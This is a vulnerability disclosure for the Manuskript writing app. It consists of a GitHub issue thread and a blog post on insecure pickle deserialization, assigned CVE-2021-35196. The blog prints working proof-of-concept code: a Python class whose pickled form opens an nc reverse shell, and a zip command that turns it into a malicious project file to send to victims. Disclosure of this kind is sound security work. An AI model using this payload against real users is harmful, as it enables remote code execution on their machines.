| Arbitrary code execution due to insecure deserialization in settings.py.  Basically, I created a Version 0 project zip file containing a sample project with a malicious settings.pickle. loadsave.py sees it as v0 and sends it to v0.loadProject.  Line 172 of version\_0.py is where the following code calls the load function in settings.py  `settings.load(files["settings.pickle"], fromString=True)`  where on line 200 in settings.py pickle.loads insecurely deserializes your malicious settings.pickle file:  `allSettings = pickle.loads(string)`  So I could post my sample project online for others to use, or send someone my project, and when they open it, arbitrary code will execute.  Here are a couple of links to insecure deserialization in python, for those that aren't familiar with it  <https://davidhamann.de/2020/04/05/exploiting-python-pickle/> <https://frichetten.com/blog/escalating-deserialization-attacks-python/> |

| Okay, so I'm currently working on a huge refactoring which won't use pickle at all to load projects. So I assume this should be fine in the future. I'm also not sure if this is affecting only the older version 0 of load-/save-processes because the usage of pickle seems to be in settings.py.  For the moment I don't think this is affecting many people because most authors probably won't share their whole raw plots. Especially considering that Manuskript is still quite unreliable when it comes to not crashing and such. ^^'  I personally didn't even know there was such a module as pickle. So if you have a fix for this problem which can be applied soon, I can review the change. Otherwise I would add a disclaimer on the website to make users aware of the threat, so they don't open untrusted projects. |

| I was just looking at how to get to pickle.loads, and the first way I saw was from having a version 0 project. It seemed to be the only way, but I'd have to review the code some more to guarantee that.  The pickle module is inherently unsafe, and while there are some alternatives/workarounds for pickling and unpickling, if you're refactoring everything to a safer format, there probably isn't a reason to push a fix.  I'd say a warning to not open unknown projects is probably sufficient enough. |

| The security fix would be to delete the code, it shouldn't be used any more. The current save format uses json stored in a text file that is much more secure. |

# Arbitrary Code Execution in Manuskript < 0.12

Edit: A [pull request](https://github.com/olivierkes/manuskript/pull/895) has been submitted to remove this functionality and to depricate the old pickled settings, which is a wise security decision.

Edit: This vulnerability has been assigned CVE-2021-35196. It‚Äôs currently listed as disputed, even though it is definitely a vulnerability.

I was searching for an alternative to Scrivener to write my future nobel prize winning novel and ran across [Manuskript](https://www.theologeek.ch/manuskript/). It looked promising. I found out that it was open-source and on [github](https://github.com/olivierkes/manuskript) ‚Äì which is always cool.

I decided to clone it and take a look at it. It‚Äôs written in Python, so that is good for me. It‚Äôs probably the language I‚Äôm most comfortable in these days.

I started checking out the code and I immediately noticed that pickle was imported in settings.py. The first thing that should come to mind to any security researcher worth their salt is insecure deserialization via the `pickle.loads()` and `pickle.load()` functions.

Sure enough, in settings.py, I noticed on lines 190 and 191, it looks like the program‚Äôs settings are loaded via `pickle.loads()` and `pickle.load()`, respectively. Now, I just had to figure out how to get to that point in the code.

It turns out that this wasn‚Äôt overly tough and it would simply involve loading a project that contains a malicious `settings.pickle` file. In `loadSave.py`, the function loadProject() on line 30 is responsible for doing exactly what you think it is supposed to do. You will notice in this function that it checks to see if the project is a zip file, but the project does not have to be a zip file.

I used a zip file in my exploit because that would probably be what is used in a realistic exploitation scenario. e.g. I send a malicious project to a co-writer, editor, publisher, etc. or I post a sample project of some sort online for others to use.

After the function determines if the project is a zip file or not, it checks the version of the project. This is where you need to do a small amount of work to exploit the insecure deserialization. It turns out that Manuskript has two versions of settings, version 0 and version 1. Version 0 is the one that uses the pickle module to deserialize the settings.

In order to force the program into the insecure deserialization, we just have to have a zip file without a `MANUSKRIPT` text file or a `VERSION` text file in the project and the project number will default to 0, which is what we want.

Now, onto the exploit. There are many references to insecure deserialization online, so google them if you aren‚Äôt familiar, but here is the code I used on Ubuntu 20.04 to generate a reverse shell to localhost port 1234. This payload can easily be modified to do anything you want it to do on Linux, Mac, and/or Windows. When this code is ran, it outputs a malicious settings.pickle file, which we will include in the project.

```
#!/usr/bin/env python3

import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
       	cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

pickle_data = pickle.dumps(EvilPickle())
with open("settings.pickle", "wb") as file:
    file.write(pickle_data)
```

After the settings.pickle file is output, simply zip it up:

```
zip malicious-project.zip settings.pickle
```

And now you have a malicious-project.zip file that you simply load into Manuskript.

I notified the people involved and they don‚Äôt have intentions to fix this issue. They are currently refactoring the project and the deserialization code may be removed altogether.
